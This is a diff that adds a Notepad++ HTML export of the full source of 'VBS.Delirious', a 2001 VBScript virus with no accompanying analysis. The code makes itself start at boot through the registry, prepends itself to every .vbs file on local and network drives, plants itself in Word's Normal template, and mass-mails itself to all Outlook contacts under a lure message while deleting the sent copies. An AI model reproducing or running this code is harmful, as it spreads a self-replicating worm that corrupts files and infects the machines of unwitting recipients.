@@ -1,0 +1,155 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'VBS.Delirious
+'Written by PetiK on 06/28/2001 in France
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">sf</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ws</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fl</span><span class="sc6">=</span><span class="sc7">sf.OpenTextFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">virus</span><span class="sc6">=</span><span class="sc7">fl.ReadAll</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">win</span><span class="sc6">=</span><span class="sc7">sf.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">sys</span><span class="sc6">=</span><span class="sc7">sf.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">cpy</span><span class="sc6">=</span><span class="sc7">sf.GetFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">cpy.Copy</span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\Delirious.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">r</span><span class="sc6">=(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Delire"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc7">r</span><span class="sc6">,(</span><span class="sc7">win&amp;</span><span class="sc4">"\Delirious.vbs"</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">cpy</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\Delirious.vbs"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc7">cpy&amp;</span><span class="sc4">" is not a VBS file valid."</span><span class="sc6">,</span><span class="sc7">vbcritical</span><span class="sc6">,</span><span class="sc7">cpy</span><span class="sc0">
+</span><span class="sc3">else</span><span class="sc0">
+
+</span><span class="sc7">Disque</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">Word</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">Spread</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"Look at my new virus !"</span><span class="sc6">+</span><span class="sc7">VbCrLf</span><span class="sc6">+</span><span class="sc4">"Delirious, isn't it ??"</span><span class="sc6">,</span><span class="sc7">vbinformation</span><span class="sc6">,</span><span class="sc4">"VBS.Delirious coded by PetiK (c)2001"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc7">bureau</span><span class="sc6">=</span><span class="sc7">ws.SpecialFolders</span><span class="sc6">(</span><span class="sc4">"Desktop"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">link</span><span class="sc6">=</span><span class="sc7">ws.CreateShortCut</span><span class="sc6">(</span><span class="sc7">bureau&amp;</span><span class="sc4">"\Site_Web.url"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">link.TargetPath</span><span class="sc6">=</span><span class="sc4">"http://www.jememarre.com"</span><span class="sc0">
+</span><span class="sc7">link.Save</span><span class="sc0">
+
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Disque</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">not</span><span class="sc0"> </span><span class="sc7">sf.FileExists</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">sys&amp;</span><span class="sc4">"\DeliriousFile.txt"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">DF</span><span class="sc6">=</span><span class="sc7">sf.CreateTextFile</span><span class="sc6">(</span><span class="sc7">sys&amp;</span><span class="sc4">"\DeliriousFile.txt"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">DF.WriteLine</span><span class="sc0"> </span><span class="sc4">"Infected file by VBS.Delirious"</span><span class="sc0">
+</span><span class="sc7">DF.WriteLine</span><span class="sc0"> </span><span class="sc4">"Fichiers infectés par VBS.Delirious :"</span><span class="sc0">
+</span><span class="sc7">DF.WriteBlankLines</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">DF.Close</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">dr</span><span class="sc6">=</span><span class="sc7">sf.Drives</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">d</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">dr</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">d.DriveType</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">d.DriveType</span><span class="sc6">=</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">liste</span><span class="sc6">(</span><span class="sc7">d.path&amp;</span><span class="sc4">"\"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">infection</span><span class="sc6">(</span><span class="sc7">dossier</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">=</span><span class="sc7">sf.GetFolder</span><span class="sc6">(</span><span class="sc7">dossier</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc6">=</span><span class="sc7">f.Files</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">F</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc0">
+</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc7">sf.GetExtensionName</span><span class="sc6">(</span><span class="sc7">F.path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc7">lcase</span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"vbs"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">verif</span><span class="sc6">=</span><span class="sc7">sf.OpenTextFile</span><span class="sc6">(</span><span class="sc7">F.path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">verif.ReadLine</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"'VBS.Delirious"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">tout</span><span class="sc6">=</span><span class="sc7">verif.ReadAll</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">verif.Close</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">inf</span><span class="sc6">=</span><span class="sc7">sf.OpenTextFile</span><span class="sc6">(</span><span class="sc7">F.path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">inf.Write</span><span class="sc6">(</span><span class="sc7">virus</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">inf.Write</span><span class="sc6">(</span><span class="sc7">tout</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">inf.Close</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">DF</span><span class="sc6">=</span><span class="sc7">sf.OpenTextFile</span><span class="sc6">(</span><span class="sc7">sys&amp;</span><span class="sc4">"\DeliriousFile.txt"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">DF.WriteLine</span><span class="sc0"> </span><span class="sc7">F.path</span><span class="sc0">
+</span><span class="sc7">DF.Close</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">liste</span><span class="sc6">(</span><span class="sc7">dossier</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">=</span><span class="sc7">sf.GetFolder</span><span class="sc6">(</span><span class="sc7">dossier</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">sd</span><span class="sc6">=</span><span class="sc7">f.SubFolders</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">F</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">sd</span><span class="sc0">
+</span><span class="sc7">infection</span><span class="sc6">(</span><span class="sc7">F.path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">liste</span><span class="sc6">(</span><span class="sc7">F.path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Word</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">CODE</span><span class="sc6">=</span><span class="sc7">sf.CreateTextFile</span><span class="sc6">(</span><span class="sc7">sys&amp;</span><span class="sc4">"\DeliriousCode.txt"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">CODE.Write</span><span class="sc6">(</span><span class="sc7">virus</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">CODE.Close</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Delirious\InfectNormal"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"OK"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">wrd</span><span class="sc6">=</span><span class="sc7">WScript.CreateObject</span><span class="sc6">(</span><span class="sc4">"Word.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">wrd.Visible</span><span class="sc6">=</span><span class="sc3">False</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">NorT</span><span class="sc6">=</span><span class="sc7">wrd.NormalTemplate.VBProject.VBComponents</span><span class="sc0">
+</span><span class="sc7">NorT.Import</span><span class="sc0"> </span><span class="sc7">sys&amp;</span><span class="sc4">"\DeliriousCode.txt"</span><span class="sc0">
+</span><span class="sc7">wrd.Run</span><span class="sc0"> </span><span class="sc4">"Normal.ThisDocument.AutoExec"</span><span class="sc0">
+</span><span class="sc7">wrd.Quit</span><span class="sc0">
+</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKLM\Software\Microsoft\Delirious\InfectNormal"</span><span class="sc6">,</span><span class="sc4">"OK"</span><span class="sc0"> 
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Spread</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">WHO</span><span class="sc6">=</span><span class="sc7">ws.RegRead</span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">OA</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">MA</span><span class="sc6">=</span><span class="sc7">OA.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">C</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">MA.AddressLists</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">C.AddressEntries.Count</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">D</span><span class="sc6">=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">C.AddressEntries.Count</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">AD</span><span class="sc6">=</span><span class="sc7">C.AddressEntries</span><span class="sc6">(</span><span class="sc7">D</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">EM</span><span class="sc6">=</span><span class="sc7">OA.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">EM.To</span><span class="sc6">=</span><span class="sc7">AD.Address</span><span class="sc0">
+</span><span class="sc7">EM.Subject</span><span class="sc6">=</span><span class="sc4">"Delirious EMail from "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">WHO</span><span class="sc0">
+</span><span class="sc7">body</span><span class="sc6">=</span><span class="sc4">"Hi "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">AD.Name</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">","</span><span class="sc0">
+</span><span class="sc7">body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">body</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Look at this funny attached."</span><span class="sc0">
+</span><span class="sc7">body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">body</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc7">body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">body</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"    Best Regards "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">WHO</span><span class="sc0">
+</span><span class="sc7">EM.Body</span><span class="sc6">=</span><span class="sc7">body</span><span class="sc0">
+</span><span class="sc7">EM.Attachments.Add</span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\Delirious.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">EM.DeleteAfterSubmit</span><span class="sc6">=</span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">EM.To</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">EM.Send</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc7">Sub</span></div></body>
+</html>
